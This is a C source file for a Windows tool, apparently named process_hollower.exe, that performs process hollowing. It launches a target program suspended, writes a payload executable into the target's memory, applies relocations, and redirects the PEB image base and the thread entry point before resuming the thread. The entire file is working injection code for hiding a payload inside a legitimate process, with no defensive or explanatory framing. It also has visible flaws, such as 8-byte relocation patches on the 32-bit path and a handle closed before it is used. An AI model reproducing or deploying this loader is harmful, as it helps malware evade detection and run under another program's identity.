#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#define PREFIX_INFO "[INFO] "
#define PREFIX_ERROR "[ERROR] "
#define INFO(str, ...) printf(PREFIX_INFO str, __VA_ARGS__)
#define ERR(str, ...) printf(PREFIX_ERROR str, __VA_ARGS__)

typedef struct IMAGE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, * PIMAGE_RELOCATION_ENTRY;

int main(const int argc, char* argv[])
{
	PCHAR payloadImage = NULL;
	PCHAR targetImage = NULL;

	LPVOID targetImageBaseAddress = NULL;
	LPVOID targetPEBAddress = NULL;


	HANDLE hFile = INVALID_HANDLE_VALUE;
	LPVOID payloadBuffer = NULL;

	LPVOID allocAddress = NULL;


	STARTUPINFOA si = {sizeof(si)};
	PROCESS_INFORMATION pi;
	pi.hProcess = NULL;
	pi.hThread = NULL;

	if (argc == 3)
	{
		payloadImage = argv[1];
		targetImage = argv[2];
	}
	else
	{
		INFO("Usage: process_hollower.exe <payload pe> <target process>\n");
		return -1;
	}

	INFO("---- Process hollowing ---\n");

	do {
		// Read payload pe
		hFile = CreateFileA(
			payloadImage,
			GENERIC_READ,
			0,
			NULL,
			OPEN_EXISTING,
			0,
			NULL
		);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			ERR("Failed to open the payload PE file. Err: %d.\n", GetLastError());
			break;
		}

		DWORD fileSize = GetFileSize(hFile, NULL);
		if (fileSize == INVALID_FILE_SIZE)
		{
			ERR("Failed to get file size. Err: %d.\n", GetLastError());
			break;
		}

		payloadBuffer = HeapAlloc(GetProcessHeap(), 0, fileSize);
		if (payloadBuffer == NULL)
		{
			ERR("Failed to allocate memory for the payload. Err: %d.\n", GetLastError());
			break;
		}
	
		if (!ReadFile(
			hFile,
			payloadBuffer,
			fileSize,
			NULL,
			NULL
		))
		{
			ERR("Failed to read payload. Err: %d.\n", GetLastError());
			break;
		}

		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((UINT64)dosHeader + dosHeader->e_lfanew);
		// Check that is valid PE
		if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
		{
			ERR("payload is not a valid PE file.\n");
			break;
		}

		INFO("payload PE is valid!.\n");


		INFO("Creating suspended target process ...\n");
		if (!CreateProcessA(
			NULL,
			targetImage,
			NULL,
			NULL,
			FALSE,
			CREATE_SUSPENDED,
			NULL,
			NULL,
			&si,
			&pi
		))
		{
			ERR("Failed creating the target process. Err:%d\n", GetLastError());
			break;
		}

		BOOL isTargetWow64 = FALSE;
		IsWow64Process(pi.hProcess, &isTargetWow64);

		if (isTargetWow64)
		{
			WOW64_CONTEXT ctx = {};
			ctx.ContextFlags = CONTEXT_FULL;
			Wow64GetThreadContext(pi.hThread, &ctx);
			if (!ReadProcessMemory(
				pi.hProcess,
				(LPVOID)((UINT64)(ctx.Ebx + 0x8)),
				&targetImageBaseAddress,
				sizeof(DWORD),
				NULL
			))
			{
				ERR("Failed reading target image base address (wow64). Err:%d\n", GetLastError());
				break;
			}
			targetPEBAddress = (LPVOID)(UINT64)ctx.Ebx;
		}
		else {
			CONTEXT ctx = {};
			ctx.ContextFlags = CONTEXT_FULL;
			GetThreadContext(pi.hThread, &ctx);
			if (!ReadProcessMemory(
				pi.hProcess,
				(LPVOID)((UINT64)(ctx.Rdx + 0x10)),
				&targetImageBaseAddress,
				sizeof(UINT64),
				NULL
			))
			{
				ERR("Failed reading target image base address (wow64). Err:%d\n", GetLastError());
				break;
			}
			targetPEBAddress = (LPVOID)(UINT64)ctx.Rdx;
		}

		// Got the targets PEB and base image address;
		INFO("Target Process PEB : 0x%p\n", targetPEBAddress);
		INFO("Target Process Image Base : 0x%p\n", targetImageBaseAddress);

		// Now check arch compatibility
		BOOL isPayloadWow64 = (ntHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC);
		
		if (isPayloadWow64)
			INFO("Payload is x86\n");
		else
			INFO("Payload is x64\n");

		if (isTargetWow64)
			INFO("Target is x86\n");
		else
			INFO("Target is x64\n");


		if (isTargetWow64 && isPayloadWow64 || !isTargetWow64 && !isPayloadWow64)
			INFO("Arch are compatible !\n");
		else
		{
			ERR("Arch are not compatible !\n");
			break;
		}

		DWORD payloadSubSystem = 0;
		DWORD targetSubSystem = 0;
		// Check subsystem
		if (isPayloadWow64)
		{
			PIMAGE_NT_HEADERS32 ntHeaders32 = (PIMAGE_NT_HEADERS32)((UINT32)dosHeader + dosHeader->e_lfanew);
			payloadSubSystem =  ntHeaders32->OptionalHeader.Subsystem;
		}
		else {
			payloadSubSystem = ntHeaders->OptionalHeader.Subsystem;
		}

		IMAGE_DOS_HEADER targetDosHeader;
		ReadProcessMemory(
			pi.hProcess, 
			targetImageBaseAddress, 
			(LPVOID)&targetDosHeader,
			sizeof(IMAGE_DOS_HEADER), 
			NULL);

		if (isTargetWow64)
		{
			IMAGE_NT_HEADERS32 targetNtHeaders;
			ReadProcessMemory(
				pi.hProcess,
				(LPVOID)((UINT64)targetImageBaseAddress + targetDosHeader.e_lfanew),
				(LPVOID)&targetNtHeaders,
				sizeof(IMAGE_NT_HEADERS32),
				NULL);
			targetSubSystem = targetNtHeaders.OptionalHeader.Subsystem;
		}
		else
		{
			IMAGE_NT_HEADERS64 targetNtHeaders;
			ReadProcessMemory(
				pi.hProcess,
				(LPVOID)((UINT64)targetImageBaseAddress + targetDosHeader.e_lfanew),
				(LPVOID)&targetNtHeaders,
				sizeof(PIMAGE_NT_HEADERS64),
				NULL);
			targetSubSystem = targetNtHeaders.OptionalHeader.Subsystem;
		}

		INFO("Target subsystem : 0x%X\n", targetSubSystem);
		INFO("Payload subsystem : 0x%X\n", payloadSubSystem);

		if (targetSubSystem == payloadSubSystem)
		{
			INFO("Subsystems are equals.\n");
		}
		else {
			INFO("Subsystems are different (Source: 0x%X, Target: 0x%X). This may cause undefined behavior.\n",
				payloadSubSystem, targetSubSystem);
		}

		// Should reloc?
		BOOL reloc = FALSE;
		if(isPayloadWow64)
		{
			PIMAGE_NT_HEADERS32 ntHeaders32 = (PIMAGE_NT_HEADERS32)((UINT64)dosHeader + dosHeader->e_lfanew);
			reloc = (ntHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0);
		}
		else {
			PIMAGE_NT_HEADERS64 ntHeaders64 = (PIMAGE_NT_HEADERS64)((UINT64)dosHeader + dosHeader->e_lfanew);
			reloc = (ntHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0);
		}

		if (!reloc)
		{
			INFO("The payload dosent have reloc table.\n");
		}
		else
		{
			INFO("The payload image have a relo table.\n");
		}

		// Copy and run payload
		// pi , payload buffer
		if (isPayloadWow64)
		{
			PIMAGE_NT_HEADERS32 ntHeader32 = (PIMAGE_NT_HEADERS32)((UINT64)dosHeader + dosHeader->e_lfanew);
			allocAddress = VirtualAllocEx(
				pi.hProcess,
				NULL,
				ntHeader32->OptionalHeader.SizeOfImage,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_EXECUTE_READWRITE);

			UINT64 DeltaImageBase = (UINT64)allocAddress - ntHeader32->OptionalHeader.ImageBase;
			ntHeader32->OptionalHeader.ImageBase = (UINT64)allocAddress;

			// Copy all payload headers
			WriteProcessMemory(
				pi.hProcess,
				allocAddress,
				payloadBuffer,
				ntHeader32->OptionalHeader.SizeOfHeaders,
				NULL);

			INFO("Headers write at : 0x%p\n", allocAddress);

			IMAGE_DATA_DIRECTORY payloadDataReloc = ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			PIMAGE_SECTION_HEADER payloadRelocSection = NULL;
			for (int i = 0; i < ntHeader32->FileHeader.NumberOfSections; i++)
			{
				PIMAGE_SECTION_HEADER payloadSectionHeader =
					(PIMAGE_SECTION_HEADER)(
						(UINT64)ntHeader32
						+ 4 /*Signature size*/
						+ sizeof(IMAGE_FILE_HEADER)
						+ ntHeader32->FileHeader.SizeOfOptionalHeader
						+ (i * sizeof(IMAGE_SECTION_HEADER))
						);

				// Check if its the .reloc section
				if (payloadDataReloc.VirtualAddress >= payloadSectionHeader->VirtualAddress
					&& payloadDataReloc.VirtualAddress < (payloadSectionHeader->VirtualAddress + payloadSectionHeader->Misc.VirtualSize))
					payloadRelocSection = payloadSectionHeader;

				// Write the section to the target
				WriteProcessMemory(
					pi.hProcess,
					(LPVOID)((UINT64)allocAddress + payloadSectionHeader->VirtualAddress),
					(LPVOID)((UINT64)payloadBuffer + payloadSectionHeader->PointerToRawData),
					payloadSectionHeader->SizeOfRawData,
					NULL);

				INFO("Section %s write at : 0x%p.\n",
					(LPSTR)payloadSectionHeader->Name,
					(LPVOID)((UINT64)allocAddress + payloadSectionHeader->VirtualAddress));
			}

			if (reloc && payloadRelocSection == NULL)
			{
				ERR("Error when trying to get the .reloc section of the payload.\n");
				break;
			}

			if (reloc)
			{
				INFO("Relocation section : %s\n", (char*)payloadRelocSection->Name);

				DWORD offset = 0;

				while (offset < payloadDataReloc.Size)
				{
					// Point to the current reloc block
					PIMAGE_BASE_RELOCATION payloadBaseRelocation =
						(PIMAGE_BASE_RELOCATION)(
							(UINT64)payloadBuffer
							+ payloadRelocSection->PointerToRawData
							+ offset
							);
					// Advance the offset
					offset += sizeof(IMAGE_BASE_RELOCATION);

					// Get number of entries in this block
					DWORD entriesCount = (payloadBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
					// Loop over all entries, for each patch the address
					for (DWORD i = 0; i < entriesCount; i++)
					{
						PIMAGE_RELOCATION_ENTRY payloadRelocationEntry =
							(PIMAGE_RELOCATION_ENTRY)(
								(UINT64)payloadBuffer
								+ payloadRelocSection->PointerToRawData
								+ offset
								);
						offset += sizeof(IMAGE_RELOCATION_ENTRY);

						// If no base reloc needed continue
						if (payloadRelocationEntry->Type == 0)
							continue;

						// Patch address 
						UINT64 addressLocation =
							(UINT64)allocAddress
							+ payloadBaseRelocation->VirtualAddress
							+ payloadRelocationEntry->Offset;

						UINT64 patchedAddress = addressLocation;
						ReadProcessMemory(
							pi.hProcess,
							(LPCVOID)addressLocation,
							&patchedAddress,
							sizeof(UINT64),
							NULL
						);
						patchedAddress += DeltaImageBase;
						WriteProcessMemory(
							pi.hProcess,
							(LPVOID)addressLocation,
							&patchedAddress,
							sizeof(UINT64),
							NULL
						);
					}

				}

				INFO("Relocations done.\n");
			}

			WOW64_CONTEXT ctx = {};
			ctx.ContextFlags = CONTEXT_FULL;
			Wow64GetThreadContext(pi.hThread, &ctx);

			// Write the image base address to PEB->baseImageAddress
			WriteProcessMemory(
				pi.hProcess,
				(LPVOID)((UINT64)ctx.Ebx + 0x8),
				&ntHeader32->OptionalHeader.ImageBase,
				sizeof(UINT64),
				NULL);

			// Write the new entry point address
			ctx.Eax =
				(UINT32)((UINT64)allocAddress
				+ ntHeader32->OptionalHeader.AddressOfEntryPoint);

			Wow64SetThreadContext(pi.hThread, &ctx);
			ResumeThread(pi.hThread);
		}
		else {
			PIMAGE_NT_HEADERS64 ntHeader64 = (PIMAGE_NT_HEADERS64)((UINT64)dosHeader + dosHeader->e_lfanew);
			allocAddress = VirtualAllocEx(
				pi.hProcess,
				NULL,
				ntHeader64->OptionalHeader.SizeOfImage,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_EXECUTE_READWRITE);
			
			UINT64 DeltaImageBase = (UINT64)allocAddress - ntHeader64->OptionalHeader.ImageBase;
			ntHeader64->OptionalHeader.ImageBase = (UINT64)allocAddress;

			// Copy all payload headers
			WriteProcessMemory(
				pi.hProcess,
				allocAddress,
				payloadBuffer, 
				ntHeader64->OptionalHeader.SizeOfHeaders,
				NULL);

			INFO("Headers write at : 0x%p\n", allocAddress);

			IMAGE_DATA_DIRECTORY payloadDataReloc = ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			PIMAGE_SECTION_HEADER payloadRelocSection = NULL;
			for (int i = 0; i < ntHeader64->FileHeader.NumberOfSections; i++)
			{
				PIMAGE_SECTION_HEADER payloadSectionHeader =
					(PIMAGE_SECTION_HEADER)(
						(UINT64)ntHeader64
						+ 4 /*Signature size*/
						+ sizeof(IMAGE_FILE_HEADER)
						+ ntHeader64->FileHeader.SizeOfOptionalHeader
						+ (i * sizeof(IMAGE_SECTION_HEADER))
						);

				// Check if its the .reloc section
				if (payloadDataReloc.VirtualAddress >= payloadSectionHeader->VirtualAddress
					&& payloadDataReloc.VirtualAddress < (payloadSectionHeader->VirtualAddress + payloadSectionHeader->Misc.VirtualSize))
					payloadRelocSection = payloadSectionHeader;

				// Write the section to the target
				WriteProcessMemory(
					pi.hProcess,
					(LPVOID)((UINT64)allocAddress + payloadSectionHeader->VirtualAddress),
					(LPVOID)((UINT64)payloadBuffer + payloadSectionHeader->PointerToRawData),
					payloadSectionHeader->SizeOfRawData,
					NULL);

				INFO("Section %s write at : 0x%p.\n",
					(LPSTR)payloadSectionHeader->Name,
					(LPVOID)((UINT64)allocAddress + payloadSectionHeader->VirtualAddress));
			}

			if (reloc && payloadRelocSection == NULL)
			{
				ERR("Error when trying to get the .reloc section of the payload.\n");
				break;
			}

			if (reloc)
			{
				INFO("Relocation section : %s\n", (char*)payloadRelocSection->Name);
			
				DWORD offset = 0;

				while(offset < payloadDataReloc.Size)
				{
					// Point to the current reloc block
					PIMAGE_BASE_RELOCATION payloadBaseRelocation =
						(PIMAGE_BASE_RELOCATION)(
							(UINT64)payloadBuffer
							+ payloadRelocSection->PointerToRawData
							+ offset
							);
					// Advance the offset
					offset += sizeof(IMAGE_BASE_RELOCATION);

					// Get number of entries in this block
					DWORD entriesCount = (payloadBaseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
					// Loop over all entries, for each patch the address
					for (DWORD i = 0; i < entriesCount; i++)
					{
						PIMAGE_RELOCATION_ENTRY payloadRelocationEntry =
							(PIMAGE_RELOCATION_ENTRY)(
								(UINT64)payloadBuffer 
								+ payloadRelocSection->PointerToRawData
								+ offset
								);
						offset += sizeof(IMAGE_RELOCATION_ENTRY);

						// If no base reloc needed continue
						if (payloadRelocationEntry->Type == 0)
							continue;

						// Patch address 
						UINT64 addressLocation = 
							(UINT64)allocAddress
							+ payloadBaseRelocation->VirtualAddress 
							+ payloadRelocationEntry->Offset;

						UINT64 patchedAddress = addressLocation;
						ReadProcessMemory(
							pi.hProcess,
							(LPCVOID)addressLocation,
							&patchedAddress,
							sizeof(UINT64),
							NULL
						);
						patchedAddress += DeltaImageBase;
						WriteProcessMemory(
							pi.hProcess,
							(LPVOID)addressLocation,
							&patchedAddress,
							sizeof(UINT64),
							NULL
						);
					}

				}

				INFO("Relocations done.\n");
			}

			CONTEXT ctx = {};
			ctx.ContextFlags = CONTEXT_FULL;
			GetThreadContext(pi.hThread, &ctx);

			// Write the image base address to PEB->baseImageAddress
			WriteProcessMemory(
				pi.hProcess,
				(LPVOID)((UINT64)ctx.Rdx + 0x10),
				&ntHeader64->OptionalHeader.ImageBase,
				sizeof(UINT64),
				NULL);
			
			// Write the new entry point address
			ctx.Rcx = 
				(UINT64)allocAddress 
				+ ntHeader64->OptionalHeader.AddressOfEntryPoint;

			SetThreadContext(pi.hThread, &ctx);
			ResumeThread(pi.hThread);
		}

	} while (false);



	if (hFile != NULL && hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (payloadBuffer != NULL)
		HeapFree(GetProcessHeap(), 0, payloadBuffer);
	if (pi.hProcess != NULL)
		CloseHandle(pi.hProcess);
	if (allocAddress != NULL)
	{
		BOOL success = VirtualFreeEx(
			pi.hProcess,         
			allocAddress,        
			0,                
			MEM_RELEASE       
		);
	}
		

}